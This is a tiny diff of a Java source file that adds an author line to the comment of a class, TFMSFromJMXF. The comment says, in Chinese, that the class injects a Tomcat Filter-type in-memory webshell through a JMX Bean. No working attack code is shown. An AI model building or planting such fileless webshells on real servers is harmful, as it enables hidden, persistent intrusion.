@@ -19,6 +19,7 @@ import java.util.Set;
 
 /**
  * 使用 JMX Bean 注入 Tomcat Filter 型内存马
+ * @author nu1r
  */
 public class TFMSFromJMXF implements Filter{
     static {
